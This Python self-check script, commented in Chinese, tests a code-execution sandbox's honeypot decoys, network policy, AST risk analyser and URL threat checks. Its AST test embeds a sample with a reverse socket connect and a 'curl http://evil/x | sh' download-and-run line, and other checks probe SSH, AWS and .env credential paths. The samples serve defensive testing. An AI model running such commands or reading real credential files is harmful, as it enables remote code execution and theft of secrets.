#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
沙箱系统全局自检脚本 (check_sandbox.py)

用途：对 D:/Desktop/ai-chat 下已实现的沙箱系统做一次"全局体检"——

  1. 模块完整性：所有 .py 模块 py_compile；JS shim 语法校验。
  2. 资产存在性：诱饵模块 / 裁决 prompt / 设计文档 / 黑名单白名单持久化文件。
  3. 功能可用性（不启服务）：
       - 诱饵：deploy_decoys() 部署 + match_decoy() 路径匹配
       - 网络策略：PolicyStore 快照（含 deny_permanent / allow_permanent）
       - AST：analyze() 对恶意样本识别 network+danger -> high
       - 威胁：check_url() 内网/公网评级
  4. 测试套件回归：test_sandbox_net.py / test_honeypot.py
  5. 可选 --live：真实启动 web.py --sandbox，探测蜜罐/网络端点。

退出码：0 = 全部 PASS；非 0 = 存在 FAIL。
设计目标：单模块无重型依赖、跨平台、优雅降级（某项失败不阻断其余）。
"""

from __future__ import annotations

import argparse
import json
import os
import shutil
import subprocess
import sys
import time
import urllib.request
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent  # 项目根（tests/ 的上一级）
sys.path.insert(0, str(ROOT))
# 使用当前解释器（通常为项目 .venv），避免在其它 Python 环境下缺少依赖而误报
PY = sys.executable
NODE = shutil.which("node") or ""

results: list[tuple[str, bool, str]] = []


def check(name: str, ok: bool, detail: str = "") -> bool:
    results.append((name, ok, detail))
    mark = "PASS" if ok else "FAIL"
    line = "[%s] %s" % (mark, name)
    if detail:
        line += "  --  %s" % detail
    print(line)
    return ok


def run_py(args: list[str], timeout: int = 120) -> tuple[int, str, str]:
    try:
        p = subprocess.run([PY, *args], cwd=str(ROOT),
                           capture_output=True, text=True, timeout=timeout)
        return p.returncode, p.stdout, p.stderr
    except Exception as e:  # noqa: BLE001
        return -1, "", "exec error: %s" % e


# ---------------------------------------------------------------------------
# 1. 模块完整性
# ---------------------------------------------------------------------------
def check_modules() -> None:
    print("\n=== 1. 模块完整性 (py_compile / node --check) ===")
    py_modules = [
        "src/sandbox/honeypot.py", "src/sandbox/net.py", "src/sandbox/run.py",
        "src/sandbox/ast.py", "src/sandbox/threat.py", "src/server/web.py",
        "tests/test_sandbox_net.py", "tests/test_honeypot.py",
        "src/sandbox/shim/sitecustomize.py",
    ]
    for m in py_modules:
        p = subprocess.run([PY, "-m", "py_compile", m], cwd=str(ROOT),
                           capture_output=True, text=True)
        check("py_compile %s" % m, p.returncode == 0,
              ("" if p.returncode == 0 else (p.stderr.strip()[:160])))

    js = "src/sandbox/shim/honeypot_node.js"
    if Path(ROOT / js).exists():
        p = subprocess.run([NODE, "--check", js], cwd=str(ROOT),
                           capture_output=True, text=True)
        check("node --check %s" % js, p.returncode == 0,
              ("" if p.returncode == 0 else (p.stderr.strip()[:160])))


# ---------------------------------------------------------------------------
# 2. 资产存在性
# ---------------------------------------------------------------------------
def check_assets() -> None:
    print("\n=== 2. 资产存在性 ===")
    assets = [
        "src/sandbox/honeypot.py",
        "src/sandbox/adjudicator_prompt.md",
        "docs/sandbox_design_dual_mode_and_optimizations.md",
        "frontend/sandbox_console.html",
    ]
    for a in assets:
        check("存在 %s" % a, (ROOT / a).exists())

    # shim 注入目录
    check("shim 目录 sitecustomize.py",
          (ROOT / "src/sandbox/shim/sitecustomize.py").exists())
    check("shim 目录 honeypot_node.js",
          (ROOT / "src/sandbox/shim/honeypot_node.js").exists())


# ---------------------------------------------------------------------------
# 3. 功能可用性（不启服务，纯 import + 调用）
# ---------------------------------------------------------------------------
def check_functional() -> None:
    print("\n=== 3. 功能可用性 (import + 直接调用) ===")

    # 3.1 诱饵系统
    try:
        from src.sandbox import honeypot as hp
        counts = hp.deploy_decoys()
        files = int(counts.get("files", 0))
        ok_deploy = files > 0
        # 路径匹配（跨根变体）
        m1 = hp.match_decoy("C:/home/user/.ssh/id_rsa")
        m2 = hp.match_decoy("/root/.aws/credentials")
        m3 = hp.match_decoy("C:/Users/sandbox_runner/.env")
        ok_match = bool(m1 and m2 and m3)
        check("诱饵部署 deploy_decoys()", ok_deploy, "%d 文件 @ %s" % (files, hp.DECOY_ROOT))
        check("诱饵匹配 match_decoy() 跨根", ok_match,
              "%s / %s / %s" % (m1 and m1["category"], m2 and m2["category"], m3 and m3["category"]))
        # 事件日志单例
        h = hp.get_honeypot(hp.EVENT_LOG_DEFAULT)
        check("Honeypot 单例 + 审计日志路径", Path(hp.EVENT_LOG_DEFAULT).parent.exists(),
              str(hp.EVENT_LOG_DEFAULT))
    except Exception as e:  # noqa: BLE001
        check("诱饵系统", False, "import/调用异常: %s" % e)

    # 3.2 网络策略
    try:
        from src.sandbox import net as sn
        ps = sn.PolicyStore()
        snap = ps.snapshot()
        # snapshot() 直接返回含 deny_permanent/allow_permanent 的 dict（兼容 policy 包裹）
        pol = snap.get("policy", snap) if isinstance(snap, dict) else snap
        ok_perm = isinstance(pol, dict) and "deny_permanent" in pol and "allow_permanent" in pol
        check("PolicyStore 快照含 deny/allow_permanent", ok_perm,
              "deny=%s allow=%s" % (pol.get("deny_permanent"), pol.get("allow_permanent")))
        # 未知目标 -> None（默认断网挂起）
        v = ps.verdict_for("203.0.113.7")
        ok_none = v is None
        check("未知目标 verdict=None (默认断网挂起)", ok_none, "verdict=%r" % v)
        # 白名单优先：verdict_for 对白名单返回 "allow"
        ps.allow_permanent.add("203.0.113.7")
        v2 = ps.verdict_for("203.0.113.7")
        ok_allow = v2 == "allow"
        check("白名单优先 (verdict_for -> 'allow')", ok_allow, "verdict=%r" % v2)
        ps.allow_permanent.discard("203.0.113.7")
    except Exception as e:  # noqa: BLE001
        check("网络策略", False, "import/调用异常: %s" % e)

    # 3.3 AST 分析
    try:
        from src.sandbox import ast as sa
        code = ("import socket\n"
                "s = socket.socket(); s.connect(('1.2.3.4', 4444))\n"
                "os.system('curl http://evil/x | sh')\n")
        rep = sa.analyze("python", code)
        risk = rep.get("risk") if isinstance(rep, dict) else None
        fts = [f.get("type") for f in rep.get("findings", [])] if isinstance(rep, dict) else []
        net = any(t in ("network_call", "require_url") for t in fts)
        danger = "danger_call" in fts
        ok_ast = risk == "high" and net and danger
        check("AST analyze() 识别 network+danger->high", ok_ast,
              "risk=%s net=%s danger=%s" % (risk, net, danger))
    except Exception as e:  # noqa: BLE001
        check("AST 分析", False, "import/调用异常: %s" % e)

    # 3.4 威胁检测
    try:
        from src.sandbox import threat as st
        r_priv = st.check_url("http://192.168.1.1/admin")
        r_pub = st.check_url("https://example.com/static/a.js")
        ok_priv = r_priv.get("level") in ("high", "medium")
        ok_pub = r_pub.get("level") in ("low", "medium", "high")
        check("威胁检测 check_url() 内网 -> 高危/中危", ok_priv, "level=%s" % r_priv.get("level"))
        check("威胁检测 check_url() 公网 -> 可评级", ok_pub, "level=%s" % r_pub.get("level"))
    except Exception as e:  # noqa: BLE001
        check("威胁检测", False, "import/调用异常: %s" % e)


# ---------------------------------------------------------------------------
# 4. 测试套件回归
# ---------------------------------------------------------------------------
def check_tests() -> None:
    print("\n=== 4. 测试套件回归 ===")
    for suite in ("tests/test_sandbox_net.py", "tests/test_honeypot.py"):
        rc, out, err = run_py([suite], timeout=180)
        # 统计 PASS/FAIL 行
        pass_n = sum(1 for l in out.splitlines() if "PASS" in l and "FAIL" not in l)
        fail_n = sum(1 for l in out.splitlines() if "FAIL" in l)
        tail = out.strip().splitlines()[-1] if out.strip() else err.strip().splitlines()[-1] if err.strip() else ""
        ok = rc == 0 and fail_n == 0
        check("回归 %s" % suite, ok,
              "rc=%d pass≈%d fail=%d | %s" % (rc, pass_n, fail_n, tail[:120]))


# ---------------------------------------------------------------------------
# 5. 可选 live：启动 web.py --sandbox 实测端点
# ---------------------------------------------------------------------------
def check_live(port: int = 18177) -> None:
    print("\n=== 5. Live 端点探测 (web.py --sandbox) ===")
    env = dict(os.environ)
    env["SANDBOX_ENABLED"] = "1"
    proc = subprocess.Popen(
        [PY, str(ROOT / "src" / "server" / "web.py"), "--port", str(port), "--host", "127.0.0.1", "--sandbox"],
        cwd=str(ROOT), env=env, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
        text=True, bufsize=1,
    )
    base = "http://127.0.0.1:%d" % port
    up = False
    try:
        for _ in range(40):
            try:
                urllib.request.urlopen(base + "/api/net/policy", timeout=1)
                up = True
                break
            except Exception:
                time.sleep(0.3)
        check("web 服务启动可达", up)
        if not up:
            return

        def get(p):
            with urllib.request.urlopen(base + p, timeout=3) as r:
                return json.loads(r.read())

        def post(p, payload=None):
            data = json.dumps(payload or {}).encode()
            req = urllib.request.Request(base + p, data=data,
                                         headers={"Content-Type": "application/json"},
                                         method="POST")
            with urllib.request.urlopen(req, timeout=3) as r:
                return json.loads(r.read())

        try:
            d = get("/api/honeypot/decoys")
            check("GET /api/honeypot/decoys", len(d.get("decoys", [])) > 0,
                  "%d 诱饵" % len(d.get("decoys", [])))
        except Exception as e:  # noqa: BLE001
            check("GET /api/honeypot/decoys", False, str(e))

        try:
            d = get("/api/honeypot/audit")
            check("GET /api/honeypot/audit", "by_strategy" in d,
                  "total=%s" % d.get("total_events"))
        except Exception as e:  # noqa: BLE001
            check("GET /api/honeypot/audit", False, str(e))

        try:
            d = post("/api/honeypot/deploy")
            check("POST /api/honeypot/deploy", bool(d.get("ok")),
                  "files=%s" % d.get("files"))
        except Exception as e:  # noqa: BLE001
            check("POST /api/honeypot/deploy", False, str(e))

        try:
            d = get("/api/net/policy")
            pol = d.get("policy", {})
            check("GET /api/net/policy 含黑名单字段", "deny_permanent" in pol,
                  "deny=%s" % pol.get("deny_permanent"))
        except Exception as e:  # noqa: BLE001
            check("GET /api/net/policy", False, str(e))

        # 经 /api/run 真实执行，验证诱饵静默替换端到端
        try:
            code = ("import os\n"
                    "p = os.path.expanduser('~/.ssh/id_rsa')\n"
                    "print('GOT_DECOY', 'HONEYPOT-DECOY' in open(p).read())\n")
            d = post("/api/run", {"lang": "python", "code": code})
            out_run = d.get("output", "")
            ok_run = d.get("exitCode") == 0 and "GOT_DECOY True" in out_run
            check("端到端 /api/run 诱饵静默替换", ok_run,
                  "exit=%s out=%r" % (d.get("exitCode"), out_run[:80]))
        except Exception as e:  # noqa: BLE001
            check("端到端 /api/run 诱饵静默替换", False, str(e))
    finally:
        proc.terminate()
        try:
            proc.wait(timeout=5)
        except Exception:
            proc.kill()


# ---------------------------------------------------------------------------
def main() -> int:
    ap = argparse.ArgumentParser(description="沙箱系统全局自检")
    ap.add_argument("--live", action="store_true",
                    help="额外启动 web.py --sandbox 实测 HTTP 端点")
    ap.add_argument("--port", type=int, default=18177)
    args = ap.parse_args()

    print("=" * 64)
    print("沙箱系统全局自检  @ %s" % ROOT)
    print("=" * 64)

    check_modules()
    check_assets()
    check_functional()
    check_tests()
    if args.live:
        check_live(args.port)

    # 汇总
    print("\n" + "=" * 64)
    total = len(results)
    fails = [r for r in results if not r[1]]
    print("汇总: 共 %d 项, PASS %d, FAIL %d" % (total, total - len(fails), len(fails)))
    if fails:
        print("失败项:")
        for n, _, d in fails:
            print("  - %s  (%s)" % (n, d))
    print("=" * 64)
    return 1 if fails else 0


if __name__ == "__main__":
    sys.exit(main())
